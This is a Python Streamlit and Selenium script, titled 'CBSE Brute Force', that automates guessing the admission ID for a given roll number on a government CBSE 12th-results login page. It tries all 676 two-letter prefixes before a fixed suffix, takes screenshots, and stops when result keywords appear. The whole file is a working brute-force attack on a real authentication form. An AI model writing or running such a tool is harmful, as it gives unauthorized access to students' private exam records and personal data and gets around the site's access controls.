import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    st.write("🛠️ [Log] Initializing Chrome Options...")
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1024,768")
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        st.write(f"📁 [Log] Chrome binary found at: {render_bin}")
        options.binary_location = render_bin
    else:
        st.write("⚠️ [Log] Chrome binary NOT found in Render path. Using default.")

    st.write("🚀 [Log] Launching WebDriver...")
    return webdriver.Chrome(options=options)

def check_for_success(driver):
    try:
        page_source = driver.page_source.lower()
        # SUCCESS indicators
        success_keys = ["marks", "statement", "subject", "total", "grade", "pass"]
        if any(key in page_source for key in success_keys):
            return True, "Success Keywords Detected"

        # Check if the login form disappeared
        roll_fields = driver.find_elements(By.ID, "rroll")
        if len(roll_fields) == 0:
            return True, "Redirected: Login inputs disappeared"
            
        # Check for the error message
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed():
            text = err_msg[0].text.lower()
            if "no data" in text:
                return False, f"Fail: {text}"
            
    except Exception as e:
        return False, f"Error during check: {str(e)}"
    return False, "Still on Login Page"

# ========================= UI =========================
st.set_page_config(page_title="Deep Debugger", layout="wide")
st.title("🔬 CBSE Brute Force: Deep Logging")

col1, col2 = st.columns([1, 2])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Suffix", "994511")
    delay = st.slider("Wait Time (sec)", 0.5, 5.0, 2.0)
    start_btn = st.button("🚀 Run with Logging")

with col2:
    st.subheader("System Logs & Live View")
    log_window = st.container(border=True)
    debug_image = st.empty()
    debug_text = st.empty()

if start_btn:
    driver = None
    try:
        log_window.write("⏳ [1/4] Starting Driver...")
        driver = get_driver()
        
        log_window.write("🌐 [2/4] Loading Target URL...")
        driver.get(URL)
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        log_window.write(f"⚡ [3/4] Starting Loop (676 combinations)...")
        
        for i, prefix in enumerate(combos):
            full_id = f"{prefix}{suffix_val}"
            
            # Step-by-step breadcrumbs
            debug_text.info(f"Currently Testing: **{full_id}**")
            
            # Action 1: Refresh Page
            driver.get(URL)
            time.sleep(1.0)
            
            # Action 2: Find Elements
            try:
                roll_in = driver.find_element(By.ID, "rroll")
                admn_in = driver.find_element(By.ID, "admn_id")
                sub_btn = driver.find_element(By.ID, "submit")
                
                # Action 3: Fill and Click
                roll_in.send_keys(roll_val)
                admn_in.send_keys(full_id)
                sub_btn.click()
                
                # Action 4: Wait and Observe
                time.sleep(delay)
                
                # Update visual debug
                screenshot = driver.get_screenshot_as_png()
                debug_image.image(screenshot, caption=f"View: {full_id}")
                
                is_hit, reason = check_for_success(driver)
                
                if is_hit:
                    log_window.success(f"💎 [4/4] MATCH FOUND: {full_id} ({reason})")
                    st.balloons()
                    break
                else:
                    if i % 5 == 0: # Log every 5 attempts to avoid flooding
                        log_window.write(f"ℹ️ Attempt {i+1}: {full_id} -> {reason}")
            
            except Exception as loop_err:
                log_window.error(f"❌ Error at {full_id}: {str(loop_err)}")
                continue

    except Exception as e:
        st.error(f"🔥 CRITICAL CRASH: {e}")
        log_window.error(f"Traceback: {str(e)}")
    finally:
        if driver:
            log_window.write("🧹 [Final] Closing browser...")
            driver.quit()
